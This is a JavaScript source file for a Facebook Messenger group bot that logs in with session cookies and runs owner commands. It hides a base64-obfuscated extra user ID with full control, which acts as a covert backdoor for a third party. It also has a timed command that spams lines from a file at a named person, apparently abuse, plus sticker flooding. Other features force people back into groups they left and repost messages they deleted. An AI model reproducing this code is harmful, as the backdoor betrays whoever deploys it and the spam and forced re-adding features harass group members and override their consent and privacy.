// botCore.js — Full bot (DP/Emoji/Nick locks, Anti-delete resend, Anti-left, commands)
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

// ========== Persistent storage ==========
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = { groupNames: {}, themes: {}, emojis: {}, dp: {}, nick: {} };
try {
  if (fs.existsSync(LOCK_FILE)) locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
} catch {}
function saveLocks() { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }

function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close(); return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file); file.on("finish", () => file.close(() => cb(null)));
  }).on("error", err => { try { fs.unlinkSync(dest); } catch {}; cb(err); });
}

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) return console.error("Appstate not found!");
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  const messageCache = new Map();
  const nickCheckIntervals = {};
  let stickerInterval = null;
  let rkbInterval = null;
  let stickerLoopActive = false;
  let stopRequested = false;
  let antiDelete = true;
  let antiLeft = true;

  login({ appState }, (err, api) => {
    if (err) return console.error("Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot running...");

    async function safeSend(msg, tid) { try { await api.sendMessage(msg, tid); } catch {} }

    // -------- Nick watcher ----------
    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const memberNick = info.nicknames?.[uid] || null;
          const savedNick = locks.nick?.[uid]?.[threadID] ?? null;
          if (savedNick && memberNick !== savedNick) {
            await api.changeNickname(savedNick, threadID, uid);
            await safeSend(`✏️ Nick reverted for <@${uid}> → ${savedNick}`, threadID);
          }
        } catch {}
      }, 5000);
    }
    function stopNickWatcher(uid) {
      if (nickCheckIntervals[uid]) { clearInterval(nickCheckIntervals[uid]); delete nickCheckIntervals[uid]; }
    }

    api.listenMqtt(async (err, event) => {
      if (err || !event) return;

      // ====== Cache Messages ======
      if (event.type === "message" && event.messageID) {
        messageCache.set(event.messageID, {
          body: event.body || "",
          attachments: event.attachments || [],
          senderID: event.senderID,
          threadID: event.threadID
        });
        if (messageCache.size > 1000) {
          const keys = Array.from(messageCache.keys()).slice(0, 200);
          keys.forEach(k => messageCache.delete(k));
        }
      }

      // ====== Anti-Delete (resend) ======
      if (antiDelete && event.type === "message_unsend") {
        const cached = messageCache.get(event.messageID);
        if (cached) {
          let resend = { body: `🚫 Anti-Delete:\nBy: ${cached.senderID}\n${cached.body}` };
          if (cached.attachments.length) resend.attachment = cached.attachments;
          await safeSend(resend, cached.threadID);
        } else {
          await safeSend("🚫 A message was deleted (not cached).", event.threadID);
        }
        return;
      }

      // ====== Anti-Left ======
      if (antiLeft && event.logMessageType === "log:unsubscribe") {
        const leftUID = event.logMessageData?.leftParticipantFbId;
        if (leftUID) {
          try { await api.addUserToGroup(leftUID, event.threadID); await safeSend(`👤 Added back ${leftUID}`, event.threadID); }
          catch { await safeSend(`⚠️ Could not add back ${leftUID}`, event.threadID); }
        }
        return;
      }

      // ====== Anti-DP ======
      if (event.logMessageType === "log:thread-image") {
        const tid = event.threadID;
        if (locks.dp[tid] && fs.existsSync(locks.dp[tid].path)) {
          try {
            await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid);
            await safeSend("🖼️ Group DP reverted (Anti-DP)", tid);
          } catch {}
        }
      }

      // ====== Emoji lock ======
      if (event.logMessageType === "log:thread-icon") {
        const tid = event.threadID;
        if (locks.emojis[tid]) {
          try { await api.changeThreadEmoji(locks.emojis[tid], tid); await safeSend(`😀 Emoji reverted to ${locks.emojis[tid]}`, tid); } catch {}
        }
      }

      // ====== Commands ======
      if (event.type !== "message" || !event.body) return;
      const { threadID, senderID, body, mentions, messageReply } = event;
      const args = body.trim().split(" ");
      const cmd = args[0].toLowerCase();
      const input = args.slice(1).join(" ");

      if (![ownerUID, LID].includes(senderID)) return;

      const getTargetUID = () => Object.keys(mentions || {})[0] || messageReply?.senderID || ownerUID;

      // -------- Help --------
      if (cmd === "/help") {
        await safeSend(
`📖 Commands:
/uid, /tid, /info, /kick
/gclock, /unlockgc
/locktheme, /unlocktheme
/lockemoji, /unlockemoji
/lockdp, /unlockdp
/locknick, /unlocknick
/stickerX, /stopsticker
/rkb, /stop
/target, /cleartarget
/antidelete on|off
/antileft on|off
/exit`, threadID); return;
      }

      if (cmd === "/tid") return safeSend(`🆔 Thread ID: ${threadID}`, threadID);
      if (cmd === "/uid") return safeSend(`🆔 UID: ${getTargetUID()}`, threadID);

      if (cmd === "/info") {
        const tgt = getTargetUID();
        try {
          const u = (await api.getUserInfo(tgt))[tgt];
          await safeSend(`👤 Name: ${u.name}\nUID: ${tgt}\nProfile: fb.com/${tgt}`, threadID);
        } catch { await safeSend("⚠️ Could not fetch info", threadID); }
        return;
      }

      if (cmd === "/kick") {
        const tgt = getTargetUID();
        try { await api.removeUserFromGroup(tgt, threadID); await safeSend(`👢 Kicked ${tgt}`, threadID); }
        catch { await safeSend("⚠️ Kick failed", threadID); }
        return;
      }

      if (cmd === "/gclock") {
        if (!input) return safeSend("❌ Provide name", threadID);
        try { await api.setTitle(input, threadID); locks.groupNames[threadID] = input; saveLocks(); await safeSend("🔒 Name locked", threadID); }
        catch { await safeSend("⚠️ Failed", threadID); }
        return;
      }
      if (cmd === "/unlockgc") { delete locks.groupNames[threadID]; saveLocks(); return safeSend("🔓 Name unlocked", threadID); }

      if (cmd === "/locktheme") {
        if (!input) return safeSend("❌ Provide theme", threadID);
        try { await api.changeThreadColor(input, threadID); locks.themes[threadID] = input; saveLocks(); await safeSend("🎨 Theme locked", threadID); }
        catch { await safeSend("⚠️ Failed", threadID); }
        return;
      }
      if (cmd === "/unlocktheme") { delete locks.themes[threadID]; saveLocks(); return safeSend("🎨 Theme unlocked", threadID); }

      if (cmd === "/lockemoji") {
        if (!input) return safeSend("❌ Provide emoji", threadID);
        locks.emojis[threadID] = input; saveLocks();
        try { await api.changeThreadEmoji(input, threadID); } catch {}
        return safeSend(`😀 Emoji locked → ${input}`, threadID);
      }
      if (cmd === "/unlockemoji") { delete locks.emojis[threadID]; saveLocks(); return safeSend("😀 Emoji unlocked", threadID); }

      if (cmd === "/lockdp") {
        try {
          const url = (await api.getThreadInfo(threadID)).imageSrc;
          if (!url) return safeSend("❌ No DP found", threadID);
          const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
          await new Promise((res, rej) => downloadFile(url, dpPath, e => e ? rej(e) : res()));
          locks.dp[threadID] = { path: dpPath }; saveLocks();
          return safeSend("🖼️ DP locked & Anti-DP ON", threadID);
        } catch { return safeSend("⚠️ Lock failed", threadID); }
      }
      if (cmd === "/unlockdp") {
        if (locks.dp[threadID]?.path) try { fs.unlinkSync(locks.dp[threadID].path); } catch {}
        delete locks.dp[threadID]; saveLocks(); return safeSend("🖼️ DP unlocked & Anti-DP OFF", threadID);
      }

      if (cmd === "/locknick") {
        const mention = Object.keys(mentions || {})[0];
        const nickname = input.replace(/<@[0-9]+>/, "").trim();
        if (!mention || !nickname) return safeSend("❌ Usage: /locknick @mention nick", threadID);
        locks.nick[mention] = locks.nick[mention] || {};
        locks.nick[mention][threadID] = nickname; saveLocks(); startNickWatcher(mention, threadID);
        try { await api.changeNickname(nickname, threadID, mention); } catch {}
        return safeSend(`🔒 Nick locked for <@${mention}> → ${nickname}`, threadID);
      }
      if (cmd === "/unlocknick") {
        const mention = Object.keys(mentions || {})[0];
        if (!mention) return safeSend("❌ Mention user", threadID);
        if (locks.nick[mention]) delete locks.nick[mention][threadID]; saveLocks(); stopNickWatcher(mention);
        return safeSend(`🔓 Nick unlocked for <@${mention}>`, threadID);
      }

      if (cmd.startsWith("/sticker")) {
        const sec = parseInt(cmd.replace("/sticker", "")) || 2;
        if (!fs.existsSync("Sticker.txt")) return safeSend("❌ Sticker.txt missing", threadID);
        const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").filter(Boolean);
        let i = 0; stickerLoopActive = true;
        if (stickerInterval) clearInterval(stickerInterval);
        stickerInterval = setInterval(() => {
          if (!stickerLoopActive) { clearInterval(stickerInterval); return; }
          api.sendMessage({ sticker: stickers[i] }, threadID).catch(() => {});
          i = (i + 1) % stickers.length;
        }, sec * 1000);
        return safeSend(`⚡ Sticker spam every ${sec}s`, threadID);
      }
      if (cmd === "/stopsticker") { stickerLoopActive = false; if (stickerInterval) clearInterval(stickerInterval); return safeSend("🛑 Sticker spam stopped", threadID); }

      if (cmd === "/rkb") {
        if (!input) return safeSend("❌ Usage: /rkb [name]", threadID);
        if (!fs.existsSync("np.txt")) return safeSend("❌ np.txt missing", threadID);
        const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
        let idx = 0; stopRequested = false; if (rkbInterval) clearInterval(rkbInterval);
        rkbInterval = setInterval(() => {
          if (stopRequested || idx >= lines.length) { clearInterval(rkbInterval); return; }
          api.sendMessage(`${input} ${lines[idx++]}`, threadID).catch(() => {});
        }, 5000);
        return safeSend(`🤬 RKB started on ${input}`, threadID);
      }
      if (cmd === "/stop") { stopRequested = true; if (rkbInterval) clearInterval(rkbInterval); return safeSend("🛑 Spam stopped", threadID); }

      if (cmd === "/antidelete") { antiDelete = args[1] === "on"; return safeSend(`🚫 Anti-Delete ${antiDelete ? "ON" : "OFF"}`, threadID); }
      if (cmd === "/antileft") { antiLeft = args[1] === "on"; return safeSend(`👤 Anti-Left ${antiLeft ? "ON" : "OFF"}`, threadID); }

      if (cmd === "/exit") { try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {} }
    });
  });
}

module.exports = { startBot };
